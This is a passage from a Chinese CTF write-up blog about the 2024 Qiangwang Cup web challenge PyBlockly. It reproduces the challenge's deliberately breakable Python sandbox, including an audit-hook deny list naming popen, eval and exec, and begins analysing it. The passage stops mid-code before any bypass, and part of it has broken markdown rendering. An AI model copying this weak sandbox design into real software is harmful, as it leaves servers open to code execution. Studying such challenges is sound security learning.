



<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta name="referrer" content="no-referrer"/>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#FFF">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
  <meta http-equiv="Cache-Control" content="no-transform">
  <meta http-equiv="Cache-Control" content="no-siteapp">


<link rel="alternate" type="application/rss+xml" title="golden的部落阁" href="http://blog.g01den.top/rss.xml" />
<link rel="alternate" type="application/atom+xml" title="golden的部落阁" href="http://blog.g01den.top/atom.xml" />
<link rel="alternate" type="application/json" title="golden的部落阁" href="http://blog.g01den.top/feed.json" />

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="/css/app.css?v=0.2.5">

  
  <meta name="keywords" content="Game" />


<link rel="canonical" href="http://blog.g01den.top/posts/666fe8df.html">



  <title>
【2024】强网杯 - CTFer的比赛之路 |
golden的部落阁 = golden的部落阁 = subtitle写得真好</title>
<meta name="generator" content="Hexo 7.2.0"></head>
<body itemscope itemtype="http://schema.org/WebPage">
  <div id="loading">
    <div class="cat">
      <div class="body"></div>
      <div class="head">
        <div class="face"></div>
      </div>
      <div class="foot">
        <div class="tummy-end"></div>
        <div class="bottom"></div>
        <div class="legs left"></div>
        <div class="legs right"></div>
      </div>
      <div class="paw">
        <div class="hands left"></div>
        <div class="hands right"></div>
      </div>
    </div>
  </div>
  <div id="container">
    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="inner">
        <div id="brand">
          <div class="pjax">
          
  <h1 itemprop="name headline">【2024】强网杯
  </h1>
  
<div class="meta">
  <span class="item" title="创建时间：2024-11-03 19:28:49">
    <span class="icon">
      <i class="ic i-calendar"></i>
    </span>
    <span class="text">发表于</span>
    <time itemprop="dateCreated datePublished" datetime="2024-11-03T19:28:49+08:00">2024-11-03</time>
  </span>
</div>


          </div>
        </div>
        <nav id="nav">
  <div class="inner">
    <div class="toggle">
      <div class="lines" aria-label="切换导航栏">
        <span class="line"></span>
        <span class="line"></span>
        <span class="line"></span>
      </div>
    </div>
    <ul class="menu">
      <li class="item title"><a href="/" rel="start">golden的部落阁</a></li>
    </ul>
    <ul class="right">
      <li class="item theme">
        <i class="ic i-sun"></i>
      </li>
      <li class="item search">
        <i class="ic i-search"></i>
      </li>
    </ul>
  </div>
</nav>

      </div>
      <div id="imgs" class="pjax">
          <img src="https://s2.loli.net/2024/11/03/5dW8XfVzCkRBOAZ.jpg">
      </div>
    </header>
    <div id="waves">
      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
        <defs>
          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
        </defs>
        <g class="parallax">
          <use xlink:href="#gentle-wave" x="48" y="0" />
          <use xlink:href="#gentle-wave" x="48" y="3" />
          <use xlink:href="#gentle-wave" x="48" y="5" />
          <use xlink:href="#gentle-wave" x="48" y="7" />
        </g>
      </svg>
    </div>
    <main>
      <div class="inner">
        <div id="main" class="pjax">
          
  <div class="article wrap">
    
<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
<i class="ic i-home"></i>
<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/Game/" itemprop="item" rel="index" title="分类于 CTFer的比赛之路"><span itemprop="name">CTFer的比赛之路</span></a>
<meta itemprop="position" content="1" /></span>
</div>

    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
  <link itemprop="mainEntityOfPage" href="http://blog.g01den.top/posts/666fe8df.html">

  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="image" content="/images/avatar.jpg">
    <meta itemprop="name" content="g01den">
    <meta itemprop="description" content="subtitle写得真好, golden的部落阁">
  </span>

  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="golden的部落阁">
  </span>

  <div class="body md" itemprop="articleBody">
    

    <h1 id="web"><a class="markdownIt-Anchor" href="#web">#</a> web：</h1>
<h2 id="pyblockly"><a class="markdownIt-Anchor" href="#pyblockly">#</a> PyBlockly：</h2>
<p>​		网站是一个通过 block 的堆积木的形式编程，有两种数据类型以及四种函数，分别是正常运算，print 输出，min 和 max 功能，随便写一些代码，发现结果会回显出来。</p>
<p>​		再来看看源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> unidecode</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> importlib.util</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;JSON_AS_ASCII&#x27;</span>] = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">blacklist_pattern = <span class="string">r&quot;[!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\\]^_`&#123;|&#125;~]&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">module_exists</span>(<span class="params">module_name</span>):</span><br><span class="line">    spec = importlib.util.find_spec(module_name)</span><br><span class="line">    <span class="keyword">if</span> spec <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> module_name <span class="keyword">in</span> sys.builtin_module_names:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> spec.origin:</span><br><span class="line">        std_lib_path = os.path.dirname(os.__file__)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> spec.origin.startswith(std_lib_path) <span class="keyword">and</span> <span class="keyword">not</span> spec.origin.startswith(os.getcwd()):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_secure</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">for</span> node <span class="keyword">in</span> ast.walk(m):</span><br><span class="line">        <span class="keyword">match</span> <span class="built_in">type</span>(node):</span><br><span class="line">            <span class="keyword">case</span> ast.Import:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;ERROR: Banned module &quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">case</span> ast.ImportFrom:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;ERROR: Banned module <span class="subst">&#123;node.module&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_for_blacklisted_symbols</span>(<span class="params">input_text</span>):</span><br><span class="line">    <span class="keyword">if</span> re.search(blacklist_pattern, input_text):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">block_to_python</span>(<span class="params">block</span>):</span><br><span class="line">    block_type = block[<span class="string">&#x27;type&#x27;</span>]</span><br><span class="line">    code = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> block_type == <span class="string">&#x27;print&#x27;</span>:</span><br><span class="line">        text_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        text = block_to_python(text_block)</span><br><span class="line">        code = <span class="string">f&quot;print(<span class="subst">&#123;text&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;math_number&#x27;</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;NUM&#x27;</span>]).isdigit():</span><br><span class="line">            code = <span class="built_in">int</span>(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;NUM&#x27;</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;text&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> check_for_blacklisted_symbols(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>]):</span><br><span class="line">            code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">            code = <span class="string">&quot;&#x27;&quot;</span> + unidecode.unidecode(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>]) + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;max&#x27;</span>:</span><br><span class="line"></span><br><span class="line">        a_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;A&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        b_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;B&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        a = block_to_python(a_block)</span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code = <span class="string">f&quot;max(<span class="subst">&#123;a&#125;</span>, <span class="subst">&#123;b&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> block_type == <span class="string">&#x27;min&#x27;</span>:</span><br><span class="line">        a_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;A&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        b_block = block[<span class="string">&#x27;inputs&#x27;</span>][<span class="string">&#x27;B&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line">        a = block_to_python(a_block)</span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code = <span class="string">f&quot;min(<span class="subst">&#123;a&#125;</span>, <span class="subst">&#123;b&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;next&#x27;</span> <span class="keyword">in</span> block:</span><br><span class="line"></span><br><span class="line">        block = block[<span class="string">&#x27;next&#x27;</span>][<span class="string">&#x27;block&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        code += <span class="string">&quot;\n&quot;</span> + block_to_python(block) + <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> code</span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">json_to_python</span>(<span class="params">blockly_data</span>):</span><br><span class="line">    block = blockly_data[<span class="string">&#x27;blocks&#x27;</span>][<span class="string">&#x27;blocks&#x27;</span>][<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    python_code = <span class="string">&quot;&quot;</span></span><br><span class="line">    python_code += block_to_python(block) + <span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> python_code</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do</span>(<span class="params">source_code</span>):</span><br><span class="line">    hook_code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def my_audit_hook(event_name, arg):</span></span><br><span class="line"><span class="string">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</span></span><br><span class="line"><span class="string">    if len(event_name) &gt; 4:</span></span><br><span class="line"><span class="string">        raise RuntimeError(&quot;Too Long!&quot;)</span></span><br><span class="line"><span class="string">    for bad in blacklist:</span></span><br><span class="line"><span class="string">        if bad in event_name:</span></span><br><span class="line"><span class="string">            raise RuntimeError(&quot;No!&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(source_code)</span><br><span class="line">    code = hook_code + source_code</span><br><span class="line">    tree = <span class="built_in">compile</span>(source_code, <span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> verify_secure(tree):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(code)</span><br><span class="line">            result = subprocess.run([<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;run.py&#x27;</span>], stdout=subprocess.PIPE, timeout=<span class="number">5</span>).stdout.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Execution aborted due to security concerns.&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Timeout!&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> app.send_static_file(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/blockly_json&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blockly_json</span>():</span><br><span class="line">    blockly_data = request.get_data()</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(blockly_data))</span><br><span class="line">    blockly_data = json.loads(blockly_data.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(blockly_data)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        python_code = json_to_python(blockly_data)</span><br><span class="line">        <span class="keyword">return</span> do(python_code)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Error generating Python code&quot;</span>, <span class="string">&quot;details&quot;</span>: <span class="built_in">str</span>(e)&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>​		一点小疑问，这个代码有啥用，为啥没执行：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">module_exists</span>(<span class="params">module_name</span>):</span><br><span class="line">    spec = importlib.util.find_spec(module_name)</span><br><span class="line">    <span class="keyword">if</span> spec <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> module_name <span class="keyword">in</span> sys.builtin_module_names:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> spec.origin:</span><br><span class="line">        std_lib_path = os.path.dirname(os.__file__)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> spec.origin.startswith(std_lib_path) <span class="keyword">and</span> <span class="keyword">not</span> spec.origin.startswith(os.getcwd()):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>​		这段代码定义了一个函数  <code>module_exists</code> ，用于检查一个指定的模块是否存在。这个函数通过几个步骤来判断模块是否存在，并且区分了内置模块、标准库模块和第三方或本地模块。下面是对这段代码的逐行解释：</p>
<ol>
<li>
<pre><code> def module_exists(module_name):
</code></pre>
</li>
</ol>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - 这行定义了一个名为 `module_exists` 的函数，它接受一个参数 `module_name`，即要检查的模块名。</span><br><span class="line"></span><br><span class="line">&gt;2. ```</span><br><span class="line">  spec = importlib.util.find_spec(module_name)</span><br></pre></td></tr></table></figure>
<ul>
<li>使用  <code>importlib.util.find_spec</code>  函数尝试找到名为  <code>module_name</code>  的模块的规格（spec）。这个函数返回一个模块规格对象，如果模块不存在，则返回  <code>None</code> 。</li>
</ul>
<ol start="3">
<li>
<pre><code> if spec is None:
</code></pre>
</li>
</ol>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - 这行检查 `find_spec` 返回的 `spec` 是否为 `None`。如果是，说明没有找到模块，执行下一行代码。</span><br><span class="line"></span><br><span class="line">&gt;4. ```</span><br><span class="line">  return False</span><br></pre></td></tr></table></figure>
<ul>
<li>如果模块不存在（ <code>spec</code>  为  <code>None</code> ），函数返回  <code>False</code> 。</li>
</ul>
<ol start="5">
<li>
<pre><code> if module_name in sys.builtin_module_names:
</code></pre>
</li>
</ol>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - 这行检查 `module_name` 是否在 `sys.builtin_module_names` 列表中。`sys.builtin_module_names` 包含了所有内置模块的名称。如果 `module_name` 是内置模块，执行下一行代码。</span><br><span class="line"></span><br><span class="line">&gt;6. ```</span><br><span class="line">  return True</span><br></pre></td></tr></table></figure>
<ul>
<li>如果  <code>module_name</code>  是内置模块，函数返回  <code>True</code> 。</li>
</ul>
<ol start="7">
<li>
<pre><code> if spec.origin:
</code></pre>
</li>
</ol>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - 这行检查 `spec` 对象的 `origin` 属性是否存在。`origin` 属性通常包含了模块的来源路径。如果 `origin` 存在，执行下一行代码。</span><br><span class="line"></span><br><span class="line">&gt;8. ```</span><br><span class="line">  std_lib_path = os.path.dirname(os.__file__)</span><br></pre></td></tr></table></figure>
<ul>
<li>这行获取 Python 标准库的路径。 <code>os.__file__</code>  是  <code>os</code>  模块的路径， <code>os.path.dirname</code>  获取这个路径的目录部分，即标准库的根目录。</li>
</ul>
<ol start="9">
<li>
<pre><code> if spec.origin.startswith(std_lib_path) and not spec.origin.startswith(os.getcwd()):
</code></pre>
</li>
</ol>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - 这行检查 `spec.origin` 是否以标准库路径 `std_lib_path` 开头，并且不以当前工作目录 `os.getcwd()` 开头。这是为了确保模块是标准库的一部分，而不是当前工作目录下的模块。如果这两个条件都满足，执行下一行代码。</span><br><span class="line"></span><br><span class="line">&gt;10. ```</span><br><span class="line">   return True</span><br></pre></td></tr></table></figure>
<ul>
<li>如果模块是标准库的一部分，函数返回  <code>True</code> 。</li>
</ul>
<ol start="11">
<li>
<pre><code>  return False
</code></pre>
</li>
</ol>
   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   - 如果模块既不是内置模块，也不是标准库模块，函数返回 `False`。</span><br><span class="line"></span><br><span class="line">&gt;总结：这个函数通过检查模块的规格（spec），判断模块是否存在，并进一步区分模块是内置模块、标准库模块还是其他类型的模块。如果模块存在且是内置模块或标准库模块，函数返回 `True`；否则返回 `False`。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">​		问题也就出现在这里，前后我没发现有调用过这个函数，先无所谓，看看审其他的。</span><br><span class="line"></span><br><span class="line">​		`blockly_json`函数开始，先读取参数，之后转UTF-8之后拿给json_to_python去转为python代码：</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">   python_code = &quot;&quot;</span><br><span class="line">   python_code += block_to_python(block) + &quot;\n&quot;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>​		继续审 block_to_python，这里很明显可以看出，从 type 里取值，如果是 print，max，min，next 就递归继续后面的代码或者参数，直到没有相应参数为止，之后就返回 code 了，当遇到 text 的话，就将所有的字符串进行正则比较，遇到符号就清空 code 参数，否则 code 加上去然后返回。之后就是 do 了，获得源码，然后执行：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">do</span>(<span class="params">source_code</span>):</span><br><span class="line">    hook_code = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def my_audit_hook(event_name, arg):</span></span><br><span class="line"><span class="string">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</span></span><br><span class="line"><span class="string">    if len(event_name) &gt; 4:</span></span><br><span class="line"><span class="string">        raise RuntimeError(&quot;Too Long!&quot;)</span></span><br><span class="line"><span class="string">    for bad in blacklist:</span></span><br><span class="line"><span class="string">        if bad in event_name:</span></span><br><span class="line"><span class="string">            raise RuntimeError(&quot;No!&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(source_code)</span><br><span class="line">    code = hook_code + source_code</span><br><span class="line">    tree = <span class="built_in">compile</span>(source_code, <span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> verify_secure(tree):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(code)</span><br><span class="line">            result = subprocess.run([<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;run.py&#x27;</span>], stdout=subprocess.PIPE, timeout=<span class="number">5</span>).stdout.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">            os.remove(<span class="string">&#x27;run.py&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span 